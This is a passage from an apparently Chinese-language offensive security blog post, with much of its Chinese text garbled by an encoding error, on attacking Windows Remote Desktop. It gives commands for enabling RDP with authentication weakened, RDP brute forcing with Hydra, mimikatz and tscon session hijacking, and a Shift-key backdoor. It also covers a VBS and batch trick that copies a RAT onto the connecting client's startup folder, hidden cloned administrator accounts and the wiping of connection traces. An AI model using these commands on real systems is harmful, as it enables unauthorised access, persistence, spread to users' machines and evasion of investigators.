root\cimv2\TerminalServices).SetAllowTsConnections(<span class="number">1</span>,<span class="number">1</span>) | <span class="built_in">Out-Null</span></span><br><span class="line">(<span class="built_in">Get-WmiObject</span> <span class="literal">-Class</span> <span class="string">&quot;Win32_TSGeneralSetting&quot;</span> <span class="literal">-Namespace</span> root\cimv2\TerminalServices <span class="literal">-Filter</span> <span class="string">&quot;TerminalName=&#x27;RDP-tcp&#x27;&quot;</span>).SetUserAuthenticationRequired(<span class="number">0</span>) | <span class="built_in">Out-Null</span></span><br><span class="line"><span class="built_in">Get-NetFirewallRule</span> <span class="literal">-DisplayName</span> <span class="string">&quot;Remote Desktop*&quot;</span> | <span class="built_in">Set-NetFirewallRule</span> <span class="literal">-enabled</span> true</span><br></pre></td></tr></table></figure><h2 id="Windows-Server-2019"><a href="#Windows-Server-2019" class="headerlink" title="Windows Server 2019"></a>Windows Server 2019</h2><p>å¼€å¯RDPæœåŠ¡</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-ItemProperty -Path &#39;HKLM:\System\CurrentControlSet\Control\Terminal Server&#39; -name &quot;fDenyTSConnections&quot; -value 0</span><br></pre></td></tr></table></figure><p>æ·»åŠ é˜²ç«å¢™è§„åˆ™å…è®¸RDP</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Enable-NetFirewallRule -DisplayGroup &quot;Remote Desktop&quot;</span><br></pre></td></tr></table></figure><h2 id="éæœåŠ¡å™¨ç‰ˆæœ¬çš„Windowsç³»ç»Ÿæ”¯æŒå¤šç”¨æˆ·ç™»å½•çš„æ–¹æ³•"><a href="#éæœåŠ¡å™¨ç‰ˆæœ¬çš„Windowsç³»ç»Ÿæ”¯æŒå¤šç”¨æˆ·ç™»å½•çš„æ–¹æ³•" class="headerlink" title="éæœåŠ¡å™¨ç‰ˆæœ¬çš„Windowsç³»ç»Ÿæ”¯æŒå¤šç”¨æˆ·ç™»å½•çš„æ–¹æ³•"></a>éæœåŠ¡å™¨ç‰ˆæœ¬çš„Windowsç³»ç»Ÿæ”¯æŒå¤šç”¨æˆ·ç™»å½•çš„æ–¹æ³•</h2><p>ä¸»è¦æ˜¯3gstudent å¸ˆå‚…åšå®¢çš„æ€è·¯ï¼Œ</p><blockquote><p>éæœåŠ¡å™¨ç‰ˆæœ¬çš„Windowsç³»ç»Ÿé»˜è®¤åªå…è®¸ä¸€ä¸ªè´¦æˆ·ç™»å½•</p></blockquote><p>å…·ä½“è¡¨ç°ä¸ºï¼š</p><ul><li>è¿œç¨‹ç™»å½•æ—¶ï¼Œä½¿ç”¨ä¸åŸç³»ç»Ÿç›¸åŒçš„è´¦æˆ·ï¼ŒåŸç³»ç»Ÿå°†è¢«åˆ‡æ¢åˆ°ç™»å½•ç•Œé¢</li><li>ä½¿ç”¨ä¸åŒçš„è´¦æˆ·ï¼Œç™»å½•æ—¶æç¤ºå…¶ä»–ç”¨æˆ·å·²ç™»å½•åˆ°æ­¤è®¡ç®—æœº</li><li>é€‰æ‹©ç»§ç»­åï¼ŒåŸç³»ç»Ÿæ¡Œé¢å°†å¼¹æ¡†æç¤ºæ˜¯å¦æ–­å¼€å½“å‰è¿æ¥(30ç§’åé»˜è®¤é€‰æ‹©åŒæ„ï¼Œé€€å›åˆ°ç™»å½•ç•Œé¢)</li></ul><h3 id="1-ä½¿ç”¨mimikatz"><a href="#1-ä½¿ç”¨mimikatz" class="headerlink" title="1. ä½¿ç”¨mimikatz"></a>1. ä½¿ç”¨mimikatz</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">ts::multirdp</span><br></pre></td></tr></table></figure><p>![](/Users/m0nk3y/Library/Application Support/typora-user-images/image-20210622161621291.png)</p><p>å¼€å¯å¤šç”¨æˆ·ç™»å½•åŠŸèƒ½ï¼Œæœ€é«˜æ”¯æŒåˆ°Win7</p><p><strong>ä½¿ç”¨ä¸åŸç³»ç»Ÿç›¸åŒçš„è´¦æˆ·ï¼ŒåŸç³»ç»Ÿè¿˜æ˜¯ä¼šè¢«åˆ‡æ¢åˆ°ç™»å½•ç•Œé¢</strong></p><p>ä½¿ç”¨ä¸åŸç³»ç»Ÿä¸åŒçš„è´¦æˆ·ï¼Œç™»å½•æˆåŠŸã€‚</p><h3 id="2-ä¿®æ”¹termsrv-dll"><a href="#2-ä¿®æ”¹termsrv-dll" class="headerlink" title="2. ä¿®æ”¹termsrv.dll"></a>2. ä¿®æ”¹termsrv.dll</h3><p>åŸç†ï¼šWindowsåœ¨å¼€å¯æœåŠ¡Remote Desktop Servicesæ—¶ï¼Œä¼šåŠ è½½termsrv.dl</p><p>![](/Users/m0nk3y/Library/Application Support/typora-user-images/image-20210622161930740.png)</p><p>é€šè¿‡ä¿®æ”¹å†…å­˜ä¸­çš„termsrv.dllå®ç°å¼€å¯å¤šç”¨æˆ·åŠŸèƒ½</p><p>ä¸è¿›ä¸€æ­¥æ·±å…¥äº†ï¼ŒæŠ€æœ¯æ°´å¹³è¿˜æœ‰é™ã€‚</p><h3 id="3-ä½¿ç”¨rdpwrap"><a href="#3-ä½¿ç”¨rdpwrap" class="headerlink" title="3. ä½¿ç”¨rdpwrap"></a>3. ä½¿ç”¨rdpwrap</h3><p>å½“ä¸ªjbå°å­æ¯”è¾ƒé€‚åˆæˆ‘ï¼Œæ‰€ä»¥çœ‹ç¬¬ä¸‰ç§æ–¹æ³•ï¼Œä½¿ç”¨rdpwrapè¿™ä¸ªå·¥å…·ã€‚</p><p><a href="https://github.com/stascorp/rdpwrap">https://github.com/stascorp/rdpwrap</a></p><p>C# ç‰ˆæœ¬ï¼š<a href="https://github.com/infosecn1nja/SharpDoor">https://github.com/infosecn1nja/SharpDoor</a></p><blockquote><p>SharpDoor is alternative RDPWrap written in C# to allowed multiple RDP (Remote Desktop) sessions by patching termsrv.dll file, for opsec considerations SharpDoor still using cmd.exe to run sc services to impersonating as trustedinstaller in the future will be avoiding cmd.exe usage, currently <strong>only support for Windows 10.</strong></p></blockquote><p>![](/Users/m0nk3y/Library/Application Support/typora-user-images/image-20210622162436228.png)</p><p>RDP Wrapper works as a layer between Service Control Manager and Terminal Services, so the original termsrv.dll file remains untouched. Also this method is very strong against Windows Update.</p><p>ä¸ä¿®æ”¹termsrv.dllï¼Œé€šè¿‡ä¼ å…¥ä¸åŒå‚æ•°å®ç°</p><p>å®‰è£…ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RDPWInst.exe -i is</span><br></pre></td></tr></table></figure><p>é‡Šæ”¾rdpwrap.dllå’Œrdpwrap.iniè‡³System32æ–‡ä»¶å¤¹</p><p>rdpwrap.dllä¼šè¢«åŠ è½½åˆ°åŒtermsrv.dllç›¸åŒçš„è¿›ç¨‹</p><p>æ­¤æ—¶ï¼Œèƒ½å¤Ÿä½¿ç”¨ä¸åŒç”¨æˆ·è¿›è¡Œè¿œç¨‹è¿æ¥</p><p>å¸è½½ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RDPWInst.exe -u</span><br></pre></td></tr></table></figure><h2 id="ç¡®å®šRDPæœ‰æ•ˆç”¨æˆ·å"><a href="#ç¡®å®šRDPæœ‰æ•ˆç”¨æˆ·å" class="headerlink" title="ç¡®å®šRDPæœ‰æ•ˆç”¨æˆ·å"></a>ç¡®å®šRDPæœ‰æ•ˆç”¨æˆ·å</h2><h3 id="æ˜æ–‡å¯†ç "><a href="#æ˜æ–‡å¯†ç " class="headerlink" title="æ˜æ–‡å¯†ç "></a>æ˜æ–‡å¯†ç </h3><h4 id="RDPæš´ç ´"><a href="#RDPæš´ç ´" class="headerlink" title="RDPæš´ç ´"></a>RDPæš´ç ´</h4><p>è¶…çº§å¼±å£ä»¤ï¼ˆğŸ¶ï¼‰</p><p>Lodon <a href="https://github.com/k8gege/Ladon/releases">https://github.com/k8gege/Ladon/releases</a></p><p>Goby</p><p>![](/Users/m0nk3y/Library/Application Support/typora-user-images/image-20210622211811732.png)</p><p>Hydra</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra 192.168.1.2 rdp -L user.txt -P pass.txt -V</span><br></pre></td></tr></table></figure><h4 id="SMBçˆ†ç ´"><a href="#SMBçˆ†ç ´" class="headerlink" title="SMBçˆ†ç ´"></a>SMBçˆ†ç ´</h4><p>msf</p><p>auxiliary/scanner/smb/smb_login</p><p>Ladon</p><p><a href="https://github.com/k8gege/Ladon/releases">https://github.com/k8gege/Ladon/releases</a></p><p>Goby</p><p>ä¸è¿‡è¿™ç§æš´ç ´çš„ï¼Œæ“ä½œï¼Œå¤ªåš£å¼ äº†ï¼Œæ¨èå‡Œæ™¨çš„æ—¶å€™æã€‚</p><h3 id="Hash"><a href="#Hash" class="headerlink" title="Hash"></a>Hash</h3><p>Impacketå·¥å…·åŒ…ä¸­çš„rdp_check.py è„šæœ¬å¯ä»¥é€šè¿‡hashç¡®å®šç›®æ ‡æœºå™¨æ˜¯å¦å­˜åœ¨æšä¸¾çš„ç”¨æˆ·</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation</span><br><span class="line"></span><br><span class="line">usage: rdp_check.py [-h] [-hashes LMHASH:NTHASH] target</span><br><span class="line"></span><br><span class="line">Test whether an account is valid on the target host using the RDP protocol.</span><br><span class="line"></span><br><span class="line">positional arguments:</span><br><span class="line">  target                [[domain&#x2F;]username[:password]@]&lt;targetName or address&gt;</span><br><span class="line"></span><br><span class="line">optional arguments:</span><br><span class="line">  -h, --help            show this help message and exit</span><br><span class="line"></span><br><span class="line">authentication:</span><br><span class="line">  -hashes LMHASH:NTHASH</span><br><span class="line">                        NTLM hashes, format is LMHASH:NTHASH</span><br></pre></td></tr></table></figure><p>python rdp_check.py ./administrator@10.97.45.11 -hashes :618B18AD4171A53695DD997AB02D55C4</p><h2 id="RDP-æƒé™ç»´æŒ"><a href="#RDP-æƒé™ç»´æŒ" class="headerlink" title="RDP æƒé™ç»´æŒ"></a>RDP æƒé™ç»´æŒ</h2><p>åŸæ–‡åœ°å€ï¼š<a href="http://t3ngyu.leanote.com/post/LM-RDP">http://t3ngyu.leanote.com/post/LM-RDP</a></p><h3 id="1-å…³é—­RDP-å®‰å…¨è®¤è¯"><a href="#1-å…³é—­RDP-å®‰å…¨è®¤è¯" class="headerlink" title="1. å…³é—­RDP å®‰å…¨è®¤è¯"></a>1. å…³é—­RDP å®‰å…¨è®¤è¯</h3><p>â€‹    å½“æœåŠ¡å™¨å¼€å¯å®‰å…¨è®¤è¯æ—¶ï¼Œå¿…é¡»å…ˆé€šè¿‡ç™»é™†å¯†ç æ‰èƒ½è¿›å…¥è¿œç¨‹æ¡Œé¢ï¼›å¦‚æœæœåŠ¡ç«¯ç”¨çš„æ˜¯ä¸å®‰å…¨çš„è®¤è¯æ–¹å¼ï¼Œå³å¯ä»¥å…ˆè¿œç¨‹é“¾æ¥åç™»é™†å¯ä»¥è§¦å‘Shiftåé—¨</p><p>![](/Users/m0nk3y/Library/Application Support/typora-user-images/image-20210622165057305.png)</p><p>å¦‚ä½•è®¾ç½®ä¸å®‰å…¨çš„è¿æ¥ï¼Œå»æ‰â€ä»…å…è®¸ä½¿ç”¨ç½‘ç»œçº§åˆ«çš„èº«ä»½éªŒè¯çš„è¿œç¨‹æ¡Œé¢çš„è®¡ç®—æœºè¿æ¥â€é€‰é¡¹ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯<strong>å…ˆä¸Šç³»ç»ŸåéªŒè¯ä¹Ÿä¼šåœ¨è®¡ç®—æœºæœ¬åœ°ç•™ä¸‹ä¸€å®šçš„è¿›ç¨‹ã€æ—¥å¿—ã€‚</strong></p><p>![](/Users/m0nk3y/Library/Application Support/typora-user-images/image-20210622165215060.png)</p><h3 id="2-Shiftåé—¨-RDP-Session-åŠ«æŒ"><a href="#2-Shiftåé—¨-RDP-Session-åŠ«æŒ" class="headerlink" title="2. Shiftåé—¨ + RDP Session åŠ«æŒ"></a>2. Shiftåé—¨ + RDP Session åŠ«æŒ</h3><p>è¦ç”¨åˆ°çš„å·¥å…·ï¼Œtsconï¼Œå¾®è½¯è‡ªå¸¦ã€‚</p><p>é…åˆä¸Šé¢çš„å…³é—­RDPå®‰å…¨è®¤è¯æ–¹å¼ï¼Œåˆ©ç”¨<strong>Shiftåé—¨å¯ä»¥è®©æ”»å‡»è€…å¿«é€Ÿè·å¾—Systemæƒé™</strong>ï¼Œç»“åˆRDPåŠ«æŒå¯ä»¥å®ç°æ— éœ€åˆ›å»ºç”¨æˆ·ã€ä¸æ›´æ”¹åŠ«æŒç”¨æˆ·ç™»å½•æ—¶é—´ã€è§£é”åŠ«æŒç”¨æˆ·ç•Œé¢ã€ç­‰åŠŸèƒ½ã€‚æ³¨æ„<strong>RDPåŠ«æŒéœ€è¦Systemæƒé™</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tscon id # (è¦åŠ«æŒçš„ç”¨æˆ·idï¼Œquery useræŸ¥çœ‹)</span><br></pre></td></tr></table></figure><p>å¦å¤–ä¸€ç§æ–¹æ³•å¯ä»¥é€šè¿‡åˆ›å»ºæœåŠ¡æ¿€æ´»ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sc create rdpjack binpath&#x3D;&quot;cmd.exe &#x2F;k tscon 2 &#x2F;dest:console&quot;</span><br><span class="line">net start radjack # æ‰§è¡Œååˆ‡æ¢åˆ°ç›®æ ‡ç•Œé¢ä¸‹</span><br></pre></td></tr></table></figure><p>Mimikatzä¸­ä¹Ÿæœ‰ç›¸å…³çš„åˆ©ç”¨æ¨¡å—</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe</span><br><span class="line">ts::sessions</span><br><span class="line">ts::remote &#x2F;id:1</span><br><span class="line">privilege::debug</span><br><span class="line">token::elevate</span><br><span class="line">ts::remote &#x2F;id:1</span><br></pre></td></tr></table></figure><p>RDPåŠ«æŒç»å¸¸åº”ç”¨åˆ°å¦‚ä¸‹åœºæ™¯ï¼š</p><blockquote><p>ï¼ˆ1ï¼‰éœ€è¦è·å–ç›®æ ‡ç•Œé¢ä¿¡æ¯ï¼Œå¦‚ï¼šmssqlå®¢æˆ·ç«¯è¿æ¥æ•°æ®åº“</p><p>ï¼ˆ2ï¼‰åˆ‡æ¢åŸŸç”¨æˆ·èº«ä»½ï¼ŒåŸŸå†…ææƒã€‚å¦‚ï¼šåŸŸç®¡è´¦å·ç™»å½•åœ¨å½“å‰æœºå™¨ï¼ŒæŠ“å¯†ç çš„æ–¹å¼å‡è¢«æ‹¦æˆªå¯ä»¥è€ƒè™‘è¯¥æ–¹å¼</p><p>ï¼ˆ3ï¼‰ç»•è¿‡å®‰å…¨é˜²æŠ¤ã€‚å¦‚ï¼šä¹‹å‰é‡åˆ°çš„ä¸€ä¸ªå¥‡è‘©ç¯å¢ƒï¼ŒSystemæƒé™ä½¿ç”¨produmpè¢«AVæ‹¦æˆªï¼Œä½†æ˜¯åˆ‡æ¢åˆ°ç®¡ç†å‘˜æƒé™å¯ä»¥æ­£å¸¸dumpâ€¦â€¦</p></blockquote><h2 id="RDP-æœåŠ¡å™¨åæ‰“å®¢æˆ·ç«¯"><a href="#RDP-æœåŠ¡å™¨åæ‰“å®¢æˆ·ç«¯" class="headerlink" title="RDP æœåŠ¡å™¨åæ‰“å®¢æˆ·ç«¯"></a>RDP æœåŠ¡å™¨åæ‰“å®¢æˆ·ç«¯</h2><blockquote><p> éœ€è¦å®¢æˆ·ç«¯RDPé“¾æ¥æ—¶ï¼Œå¼€å¯ç£ç›˜å…±äº«ï¼ˆå°†æœ¬åœ°ç£ç›˜æŒ‚åœ¨åˆ°æœåŠ¡å™¨ä¸Šï¼‰æ‰èƒ½æ­£å¸¸åˆ©ç”¨</p></blockquote><p>æ‰‹åŠ¨åˆ©ç”¨è¿‡ç¨‹ï¼šå‡è®¾å®¢æˆ·ç«¯å’Œç™»å½•æœåŠ¡å™¨çš„ç”¨æˆ·éƒ½æ˜¯Administrator</p><p>â€‹    ï¼ˆ1ï¼‰åœ¨æœåŠ¡å™¨ç«¯è®¾ç½®Administrator å¯åŠ¨é¡¹ç›®ï¼Œ<code>C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\StartMenu\Programs\Startup\powershell.vbs</code> ä½œç”¨æ˜¯æ— å¼¹çª—æ‰§è¡Œbatè„šæœ¬</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set ws&#x3D;WScript.CreateObject(&quot;WScript.Shell&quot;)ws.Run &quot;C:\Windows.bat&quot;,0ws.Run &quot;cmd &#x2F;c del C:\Windows\Temp\service.exe&quot;,0</span><br></pre></td></tr></table></figure><p>â€‹    ï¼ˆ2ï¼‰Windows.bat è„šæœ¬å†…å®¹å®ç°é©¬ï¼ˆservice.exeï¼‰æ‹·è´åˆ°å®¢æˆ·ç«¯çš„<strong>å¯åŠ¨ç›®å½•</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy &quot;C:\Windows\Temp\service.exe&quot; &quot;\\tsclient\c\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\startup\service.exe&quot;</span><br></pre></td></tr></table></figure><p>ä¹Ÿå¯ä»¥æ ¹æ®å®é™…æƒ…å†µï¼Œå°†Ratæ‹·è´åˆ°å®¢æˆ·ç«¯çš„å…¶ä»–ç›®å½•ï¼Œå°†æ¿€æ´»è„šæœ¬æ‹·è´åˆ°å®¢æˆ·ç«¯å¯åŠ¨ç›®å½•ï¼›</p><p>å¦‚æœä¸å‡ºç½‘çš„æƒ…å†µä¸‹ï¼Œä¹Ÿå¯ä»¥å°†exeæ›¿æ¢æˆè¦æ‰§è¡Œçš„è„šæœ¬ ã€‚</p><p>åˆ©ç”¨å·¥å…·ï¼š<a href="https://github.com/mdsecactivebreach/RDPInception">https://github.com/mdsecactivebreach/RDPInception</a></p><ol><li>Modify batch file to execute PowerShell stager, EXE or even DLL.</li><li>Upload to the target, execute.</li></ol><h2 id="å¼€å¯RDPå½±å­ç”¨æˆ·"><a href="#å¼€å¯RDPå½±å­ç”¨æˆ·" class="headerlink" title="å¼€å¯RDPå½±å­ç”¨æˆ·"></a>å¼€å¯RDPå½±å­ç”¨æˆ·</h2><p>åœ¨Windowsä¸­ï¼Œæ·»åŠ è´¦æˆ·ååé¢åŠ å…¥<code>$</code>ç¬¦åˆå¯ä»¥ä½¿è¯¥ç”¨æˆ·åœ¨å‘½ä»¤è¡Œä¸­éšè—</p><p>![](/Users/m0nk3y/Library/Application Support/typora-user-images/image-20210622213958809.png)</p><p>net user æ˜¯çœ‹ä¸åˆ°çš„ï¼Œä½†æ˜¯ç¡®å®å­˜åœ¨ã€‚</p><p>![](/Users/m0nk3y/Library/Application Support/typora-user-images/image-20210622214055156.png)</p><p>å°†å½±å­ç”¨æˆ·æ·»åŠ åˆ°ç®¡ç†å‘˜ç»„ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net localgroup administrators nb666$ /add</span><br></pre></td></tr></table></figure><p>è¿™ç‚¹éšè—å®Œå…¨ä¸å¤Ÿï¼ŒWindowsç”¨æˆ·çš„ç™»å½•ç•Œé¢ï¼Œä¼šæ˜¾ç¤ºæ‰€æœ‰å¯ä»¥ç™»å½•çš„ç”¨æˆ·ã€‚</p><h3 id="å½±å­ç”¨æˆ·éšè—ç™»å½•ç•Œé¢"><a href="#å½±å­ç”¨æˆ·éšè—ç™»å½•ç•Œé¢" class="headerlink" title="å½±å­ç”¨æˆ·éšè—ç™»å½•ç•Œé¢"></a>å½±å­ç”¨æˆ·éšè—ç™»å½•ç•Œé¢</h3><p>æ–¹æ³•ï¼šæ›´æ”¹æ³¨å†Œè¡¨ï¼Œå…‹éš†è´¦å·ã€‚</p><p>å¯åŠ¨cmdï¼Œç„¶åè¾“å…¥<code>regedit</code>ï¼Œæ‰“å¼€æ³¨å†Œè¡¨ã€‚</p><p>æ‰¾åˆ° <code>HEKY_LOCAL_MACHINE\SAM\SAM\Domains\Account\User</code>ï¼Œè€Œé»˜è®¤æƒ…å†µä¸‹<code>SAM</code>é”®å€¼åªèƒ½ç”±<strong>system</strong>æƒé™è¿›è¡Œä¿®æ”¹</p><p>![](/Users/m0nk3y/Library/Application Support/typora-user-images/image-20210622215055478.png)</p><p>![](/Users/m0nk3y/Library/Application Support/typora-user-images/image-20210622215118852.png)</p><p>å¯¼å‡ºæ³¨å†Œè¡¨ï¼Œå¹¶ä¿®æ”¹Få€¼</p><p><img src="https://hackergu.com/wp-content/uploads/2020/03/618b2d75da1ba69.png"></p><p><img src="https://hackergu.com/wp-content/uploads/2020/03/b870c2bf89419b0.png" alt="img"></p><p>ç„¶åæ›¿æ¢Få€¼ï¼Œåˆ é™¤ä¹‹å‰åˆ›å»ºçš„å½±å­ç”¨æˆ·å³å¯ã€‚</p><p>å…·ä½“æ“ä½œçœ‹è°·å¸ˆå‚…çš„åšå®¢ï¼š<a href="https://hackergu.com/power-shadowuser/">https://hackergu.com/power-shadowuser/</a></p><p>ç”¨æˆ·å…‹éš†çš„æ³¨æ„äº‹é¡¹ï¼š</p><blockquote><p>æˆ‘ä»¬ä»¥<code>test$</code>èº«ä»½ç™»å½•ï¼Œä½†æ˜¯ç™»é™†ä¹‹åçš„èº«ä»½å´æ˜¯<code>WIN7</code>ç”¨æˆ·ï¼Œæ¡Œé¢ä¹Ÿæ˜¯<code>WIN7</code>ç”¨æˆ·çš„ï¼Œè¾¾åˆ°å…‹éš†æ•ˆæœã€‚æ‰€ä»¥ï¼Œåœ¨å®é™…æ“ä½œæ—¶ï¼Œè¦å°å¿ƒåœ¨æ¡Œé¢çš„æ“ä½œï¼Œä»¥é˜²è¢«å‘ç°ã€‚</p><p>è¿›è¡Œæ“ä½œçš„æ—¶å€™ï¼Œä¸è¦ä½¿ç”¨åŸŸç”¨æˆ·è¿›è¡Œæ“ä½œï¼Œè¯¥æ“ä½œåªé€‚ç”¨äºæœ¬åœ°ç”¨æˆ·ã€‚åˆ©ç”¨çš„å±€é™æ€§æ¯”è¾ƒå¤§ï¼Œåªæœ‰åœ¨ç™»å½•è¿œç¨‹æ¡Œé¢å¹¶ä¸”æƒé™è¾ƒå¤§æ—¶æ‰å¯ä»¥ç²¾ç¡®åˆ©ç”¨ã€‚</p></blockquote><h2 id="RDP-è¿æ¥ç—•è¿¹æ¸…é™¤"><a href="#RDP-è¿æ¥ç—•è¿¹æ¸…é™¤" class="headerlink" title="RDP è¿æ¥ç—•è¿¹æ¸…é™¤"></a>RDP è¿æ¥ç—•è¿¹æ¸…é™¤</h2><blockquote><p>åˆ©ç”¨â€è·³æ¿â€ä¸»æœºè¿æ¥è®¸å¤šå†…ç½‘IPåœ°å€çš„3389 åœ¨æ¸—é€ç»“æŸæ—¶æ¸…é™¤â€è„šå°â€ 3389è¿æ¥è®°å½•ä¹Ÿæ˜¯å¿…æ¸…é™¤é¡¹ç›®ä¹‹ä¸€</p></blockquote><p>è¿è¡Œregedit</p><p>æ‰¾åˆ°<code>HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default</code> è®¾ç½®ä¸ºä¸å¯æ”¹å†™ï¼Œå³ä¸ä¼šç•™è®°å½•ã€‚</p><p>å¦‚ä¸‹ï¼Œ</p><p>![](/Users/m0nk3y/Library/Application Support/typora-user-images/image-20210622221409318.png)</p><p>è¿™é‡Œä¹Ÿå¯ä»¥å¯¼å‡ºRDPçš„è¿æ¥è®°å½•ã€‚</p><p>é€šè¿‡ä»¥ä¸‹å‘½ä»¤æšä¸¾æŒ‡å®šæ³¨å†Œè¡¨é¡¹ä¸‹æ‰€æœ‰çš„çš„å­é¡¹ï¼Œå³å½“å‰ç”¨æˆ·æ‰€è¿æ¥è¿‡çš„æ‰€æœ‰çš„ä¸»æœºåï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir &quot;Registry::HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers&quot; -Name</span><br></pre></td></tr></table></figure><p>ç„¶åä½¿ç”¨ä»¥ä¸‹å‘½ä»¤æŸ¥è¯¢æŒ‡å®šæ³¨å†Œè¡¨é¡¹çš„æ³¨å†Œè¡¨é”®å€¼ï¼Œå³æŸ¥çœ‹è¿æ¥æ‰€ä½¿ç”¨çš„ç”¨æˆ·åï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(Get-ItemProperty -Path &quot;Registry::HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers\1.xxx.xxx.xxx&quot;).UsernameHint</span><br></pre></td></tr></table></figure><p>![](/Users/m0nk3y/Library/Application Support/typora-user-images/image-20210622222847702.png)</p><p>å¹¶ä¸”åœ¨è¿è¡Œmstsc.exe ï¼Œè¿æ¥æ¡†ä¸­ä¹Ÿä¼šæœ‰è¿æ¥è¿‡çš„ip/åŸŸåã€‚</p><p>è¿™ä¸ªä¿¡æ¯å‚¨å­˜åœ¨â€œæˆ‘çš„æ–‡æ¡£â€ä¸‹çš„â€œDefault.rdpâ€æ–‡ä»¶ä¸­ï¼Œåˆ æ‰å°±å¯ä»¥äº†ã€‚</p><p>![](/Users/m0nk3y/Library/Application Support/typora-user-images/image-20210622221553138.png)</p><h2 id="CVE-2019-0708-BlueKeep"><a href="#CVE-2019-0708-BlueKeep" class="headerlink" title="CVE-2019-0708(BlueKeep)"></a>CVE-2019-0708(BlueKeep)</h2><p>2019 å¹´ 5 æœˆ 14 æ—¥å¾®è½¯å®˜æ–¹å‘å¸ƒå®‰å…¨è¡¥ä¸ï¼Œä¿®å¤äº† Windows è¿œç¨‹æ¡Œé¢æœåŠ¡çš„è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼ˆCVE-2019-0708ï¼‰ï¼Œè¯¥é«˜å±æ¼æ´åˆ©ç”¨æ–¹å¼æ˜¯é€šè¿‡è¿œç¨‹æ¡Œé¢ç«¯å£ 3389ï¼ŒRDP åè®®è¿›è¡Œæ”»å‡»çš„ã€‚</p><p>æ­¤æ¼æ´æ˜¯é¢„èº«ä»½éªŒè¯ä¸”æ— éœ€ç”¨æˆ·äº¤äº’ï¼Œè¿™å°±æ„å‘³ç€è¿™ä¸ªæ¼æ´å¯ä»¥é€šè¿‡ç½‘ç»œè •è™«çš„æ–¹å¼è¢«åˆ©ç”¨ã€‚åˆ©ç”¨æ­¤æ¼æ´çš„ä»»ä½•æ¶æ„è½¯ä»¶éƒ½å¯èƒ½ä»è¢«æ„ŸæŸ“çš„è®¡ç®—æœºä¼ æ’­åˆ°å…¶ä»–æ˜“å—æ”»å‡»çš„è®¡ç®—æœºï¼Œå…¶æ–¹å¼ä¸ 2017 å¹´ WannaCry æ¶æ„è½¯ä»¶çš„ä¼ æ’­æ–¹å¼ç±»ä¼¼ã€‚</p><p>å®ƒå½±å“äº†æŸäº›æ—§ç‰ˆæœ¬çš„ Windows ç³»ç»Ÿï¼ŒåŒ…æ‹¬ï¼š</p><blockquote><p>Windows 7 foR 32-bit Systems Service Pack 1</p><p>Windows 7 for x64-based Systems Service Pack 1</p><p>Windows Server 2008 foR 32-bit Systems Service Pack 2</p><p>Windows Server 2008 foR 32-bit Systems Service Pack 2 (Server Core installation)</p><p>Windows Server 2008 for Itanium-Based Systems Service Pack 2</p><p>Windows Server 2008 for x64-based Systems Service Pack 2</p><p>Windows Server 2008 for x64-based Systems Service Pack 2 (Server Core installation)</p><p>Windows Server 2008 R2 for Itanium-Based Systems Service Pack 1</p><p>Windows Server 2008 R2 for x64-based Systems Service Pack 1</p><p>Windows Server 2008 R2 for x64-based Systems Service Pack 1 (Server Core installation)</p><p>Windows XP SP3 x86</p><p>Windows XP Professional x64 Edition SP2</p><p>Windows XP Embedded SP3 x86</p><p>Windows Server 2003 SP2 x86</p><p>Windows Server 2003 x64 Edition SP2</p></blockquote><p>Windows 8 å’Œ Windows 10 åŠä¹‹åç‰ˆæœ¬çš„ç”¨æˆ·ä¸å—æ­¤æ¼æ´çš„å½±å“ã€‚</p><p><strong>å®æˆ˜è¿˜æ²¡æˆåŠŸè¿‡</strong>ã€‚</p><h2 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h2><p><a href="https://www.jb51.net/article/93496.htm">https://www.jb51.net/article/93496.htm</a></p><p><a 